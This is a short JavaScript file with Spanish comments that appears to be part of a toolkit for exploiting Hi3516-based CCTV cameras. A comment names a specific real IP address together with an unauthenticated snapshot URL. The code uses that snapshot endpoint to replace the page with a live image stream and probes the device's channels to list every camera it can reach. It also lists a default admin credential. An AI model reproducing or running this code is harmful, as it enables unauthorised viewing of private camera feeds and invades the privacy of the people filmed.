/*
	Hi3516:
		No se puede acceder al panel que yo sepa, pero sabiendo la ruta puedes ver las imagenes sin credenciales:
		http://2.136.203.133/webcapture.jpg?command=snap&channel=1
		https://www.opencve.io/cve?vendor=hisilicon&product=hi3516_firmware
*/
class cctv{
	static load(){
		CCTV.load_menu("Hi3516",["admin@[unknown]"])
		document.querySelector("#cctv_vuln").innerHTML+="<p><a href='javascript:cctv.create_panel()'>Vulnerabilidad</a>: Se puede acceder a las imagenes sin credenciales.</p>"
	}

	static async create_panel(){
		if(cctv.img)
			return;

		document.querySelector("#cctv_box>details:nth-child(2)").open=false
		document.querySelector("#cctv_box>details:nth-child(3)").open=true
		document.querySelectorAll("body>*:not(#cctv_box)").forEach(e=>e.remove())
		cctv.img=document.createElement("img")
		document.body.append(cctv.img)
		cctv.stream_img(0)

		await cctv.load_cam_buttons()
	}

	static stream_img(chn){
		cctv.img.onload=()=>cctv.img.src=webcapture_path+chn+"?"+Math.random()
		cctv.img.onerror=cctv.img.onload
		cctv.img.onload()
	}

	static async load_cam_buttons(){
		let i=0
		while(true)
			if(await fetch(webcapture_path+(++i),{method:"HEAD"}).then(r=>r.headers.get("content-length"))<1000)
				return;
			else
				document.querySelector("#cctv_box>details:nth-child(3)").innerHTML+="<button onclick='javascript:cctv.stream_img("+i+")'>"+i+"</button>"
	}
}

const webcapture_path="/webcapture.jpg?command=snap&channel="
cctv.load()